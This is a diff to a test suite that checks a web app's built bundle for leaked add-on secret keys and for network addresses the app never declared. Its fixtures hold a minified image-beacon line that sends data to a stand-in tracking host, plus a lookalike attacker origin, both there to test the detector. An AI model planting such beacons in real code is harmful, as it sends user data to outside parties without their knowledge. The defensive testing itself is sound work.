@@ -28,6 +28,12 @@ import { basename, join } from 'node:path';
 import { afterAll, beforeAll, describe, expect, it } from 'vitest';
 
 import {
+  offendingAddresses,
+  sendersIn,
+  type InertOrigin,
+} from './testing/egress.ts';
+
+import {
   HOMOGRAPH_TOKENS,
   PRO_PHRASES,
   SUBSTRING_BANNED,
@@ -254,28 +260,189 @@ describe('the vocabulary ban, over built output', () => {
 });
 
 describe('nothing an add-on keeps to itself reached the browser', () => {
+  /**
+   * ── THE FIFTH HOST-LOCAL LIST HOLDING AN ADD-ON'S FACTS ───────────────────
+   *
+   * What stood here was five hand-written needles:
+   *
+   *     ['api_key', 'account_number', 'CarrierCredentials',
+   *      'express.api.dhl.com', 'api.canva.com']
+   *
+   * Every one of them is a fact about an ADD-ON — two `secret: true` setting
+   * keys out of the delivery add-on's manifest, the type its server half reads
+   * them into, and the two `network.allow` hostnames — written down inside an
+   * app that merely receives them. It is the same shape as `HOSTED_SLOTS`, the
+   * Czech "pro" carve-out, the ar-EG numeral allowances and the inert origins
+   * above, and it is the one with the worst consequence, because it fails
+   * SILENTLY in the direction that matters:
+   *
+   *   A THIRD CREDENTIALLED ADD-ON, vendored into either shop, would ship its
+   *   secret setting keys and its real endpoint with this gate fully green. A
+   *   grep cannot look for a needle nobody told it about, and nothing anywhere
+   *   would have gone red to say so.
+   *
+   * The two hosts' copies had already drifted by one entry — this app carried
+   * `api.canva.com` and the studio did not, with the studio's comment still
+   * announcing "the last two" of a list with one.
+   *
+   * So the needles travel with the add-on, in its own `add-on-facts.ts`, and
+   * the add-on's manifest suite asserts they cover every `secret: true` key and
+   * every allowed hostname that manifest declares. This app greps for whatever
+   * it has VENDORED.
+   */
+  const VENDORED_FACTS = import.meta.glob<{
+    NEVER_IN_A_BROWSER?: readonly { text: string; why: string }[];
+  }>('./add-ons/vendor/*/add-on-facts.ts', { eager: true });
+
+  const needles = Object.values(VENDORED_FACTS).flatMap((module) => [
+    ...(module.NEVER_IN_A_BROWSER ?? []),
+  ]);
+
+  it('greps for something at all, off a declaration in every add-on it vendors', () => {
+    // The discovery is only as honest as what it finds: a renamed export or a
+    // sync that dropped the file would leave this gate looking for nothing and
+    // passing forever, which is the defect back with a different cause.
+    const declared = Object.entries(VENDORED_FACTS);
+    expect(declared.length, 'no vendored add-on-facts were found at all').toBeGreaterThan(0);
+    const silent = declared
+      .filter(([, module]) => module.NEVER_IN_A_BROWSER === undefined)
+      .map(([file]) => file);
+    expect(silent, 'these vendored packages export no NEVER_IN_A_BROWSER').toEqual([]);
+    expect(needles.length, 'no add-on declared anything server-only').toBeGreaterThan(0);
+  });
+
   it('carries no secret setting key and no real third-party hostname', () => {
-    /*
-     * 24 D15 and D11 in the artefact. The first three are the credentialled
-     * add-on's `secret: true` setting keys and the type its server half reads
-     * them into; the last two are the only hostnames any add-on in this wave
-     * would ever call, and neither has a reason to exist in a client bundle
-     * whose transports are all demo ones.
-     */
-    const needles = [
-      'api_key',
-      'account_number',
-      'CarrierCredentials',
-      'express.api.dhl.com',
-      'api.canva.com',
-    ];
+    // 24 D15 and D11 in the artefact. Every needle is an add-on's own
+    // declaration of something that lives on its SERVER half; a demo's
+    // transports are all demo ones, so none of them belongs in a browser.
     const offenders: string[] = [];
     for (const file of built()) {
       const text = readFileSync(file, 'utf8');
       for (const needle of needles) {
-        if (text.includes(needle)) offenders.push(`${rel(file)} · ${needle}`);
+        if (text.includes(needle.text)) offenders.push(`${rel(file)} · ${needle.text}`);
       }
     }
-    expect(offenders).toEqual([]);
+    expect(offenders, `\n${offenders.join('\n')}\n`).toEqual([]);
+  });
+
+  it('bites on a leak of any of them, which is what makes the grep worth having', () => {
+    // Driven over a fixture rather than over `dist/`, so this stays true on a
+    // day the bundle is clean — which is every day until it is not.
+    const leaked = `const s={${needles[0]!.text}:"sk_live_x"};`;
+    expect(needles.some((needle) => leaked.includes(needle.text))).toBe(true);
+  });
+});
+
+/**
+ * D11 OVER THE ARTEFACT: NOT ONE ADDRESS THIS APP DID NOT DECLARE.
+ *
+ * ── WHY THE BUNDLE AND NOT ONLY THE SOURCES ─────────────────────────────────
+ *
+ * `sources.test.ts` states the same rule over `src/`. It is one inference away
+ * from what a browser loads: a bundler folds a template literal into a finished
+ * address, a dependency brings its own, an unminified comment survives into
+ * `dist/`, and the vendored add-on halves arrive here as bytes rather than as
+ * files anybody re-reads. This wave's mutant — `new Image(); img.src =
+ * "https://…"` inside a vendored delivery component — reached exactly this
+ * directory with every gate in three repos green.
+ *
+ * Minification is the reason this is worth its own gate and not a copy of the
+ * source one: in `dist/` the mutant reads `new Image` with the empty argument
+ * list dropped, so a pattern anchored on `Image(` sees nothing. The ADDRESS is
+ * the thing minification cannot disguise — a request needs somewhere to go, and
+ * the destination is a string literal in the bytes.
+ *
+ * ── WHAT THIS GATE DELIBERATELY DOES NOT DO, AND WHY ────────────────────────
+ *
+ * It does not run `sendersIn` over the built output, and that is a limitation
+ * worth stating rather than hiding: Vite's module-preload polyfill compiles a
+ * literal `fetch(n.href, r)` into the entry chunk. It is same-origin, it is the
+ * bundler's own code, and it cannot be removed — so a sender scan here would
+ * need a carve-out on day one, and a carve-out is where the last nine holes in
+ * this wave came from.
+ *
+ * The senders are checked where they are OURS (`sources.test.ts`, over `src/`),
+ * the addresses are checked here where nothing can hide them, and what a URL
+ * sink is actually HANDED is checked in `add-ons/egress.test.tsx`, which
+ * instruments the running page. No one of the three is complete; the reason
+ * there are three is that each covers what the others cannot see.
+ */
+describe('nothing in the artefact can reach a host we do not control (24 D11)', () => {
+  /**
+   * Every address allowed to appear in this app's bundle, and why it is inert.
+   *
+   * None of them can cause a request. Two are XML namespaces — identifiers for
+   * a vocabulary, which no agent dereferences — and one is a message React
+   * prints. Anything else, from any file, is a finding: this app declares no
+   * egress at all, and the add-ons' server halves are not in this bundle.
+   */
+  const OURS: readonly InertOrigin[] = [
+    {
+      origin: 'http://www.w3.org',
+      why: 'the SVG, MathML, xlink and XML namespaces React and this app write onto elements — names for a vocabulary, never fetched',
+    },
+    {
+      origin: 'https://react.dev',
+      why: "the address React prints in a minified error message so a developer can look the number up. It is text in a `throw`, and nothing loads it",
+    },
+  ];
+  /**
+   * ── AND THE ADD-ONS' ADDRESSES ARE THE ADD-ONS' TO DECLARE ────────────────
+   *
+   * The two Canva endpoints used to be written out here as well as in
+   * `sources.test.ts`, in an app that only receives that add-on. Both lists
+   * read the same declarations now — every add-on exports `INERT_ORIGINS` from
+   * its own `add-on-facts.ts`, the sync vendors it, and this reads whatever
+   * this app has vendored. See `sources.test.ts` for the AC20/D21 argument.
+   *
+   * The bundle is where the two lists legitimately differ: React writes the SVG
+   * and MathML namespaces and prints its own error address, and neither is any
+   * add-on's doing.
+   */
+  const VENDORED_ORIGINS = import.meta.glob<{
+    INERT_ORIGINS?: readonly { origin: string; why: string }[];
+  }>("./add-ons/vendor/*/add-on-facts.ts", { eager: true });
+
+  const INERT: readonly InertOrigin[] = [
+    ...OURS,
+    ...Object.values(VENDORED_ORIGINS).flatMap((module) => [...(module.INERT_ORIGINS ?? [])]),
+  ];
+
+  it('reads a declaration off every add-on this bundle was built from', () => {
+    const declared = Object.entries(VENDORED_ORIGINS);
+    expect(declared.length, 'no vendored inert-origin declarations were found').toBeGreaterThan(0);
+    const silent = declared
+      .filter(([, module]) => module.INERT_ORIGINS === undefined)
+      .map(([file]) => file);
+    expect(silent, 'these vendored packages export no INERT_ORIGINS').toEqual([]);
+  });
+
+  it('reads every emitted file, with no extension exempt', () => {
+    // An address is bytes, so nothing here is skipped for being machine-written
+    // or awkward to keep clean. `built()` already refuses to exist if the build
+    // wrote nothing.
+    expect(built().length).toBeGreaterThan(2);
+  });
+
+  it('names no address outside the ones declared inert', () => {
+    const offences = built().flatMap((file) =>
+      offendingAddresses(readFileSync(file, 'utf8'), INERT).map((url) => `${rel(file)} → ${url}`),
+    );
+    expect(offences, `\n${offences.join('\n')}\n`).toEqual([]);
+  });
+
+  it('would report the mutant, in the spelling the minifier gives it', () => {
+    // Driven over the detector, not restated beside it. The second line is what
+    // the tracker actually looked like in `dist/` — `new Image` with no
+    // parentheses — and it is why `SENDERS` stopped anchoring on one.
+    const minified = 'const o=new Image;o.src="https://tracking.example-analytics.net/p?c="+e;';
+    expect(offendingAddresses(minified, INERT)).toEqual([
+      'https://tracking.example-analytics.net/p?c=',
+    ]);
+    expect(sendersIn(minified)).toEqual(['new Image — an image beacon']);
+    // And an origin is forgiven exactly, never by prefix.
+    expect(offendingAddresses('https://react.dev.attacker.test/x', INERT)).toEqual([
+      'https://react.dev.attacker.test/x',
+    ]);
   });
 });
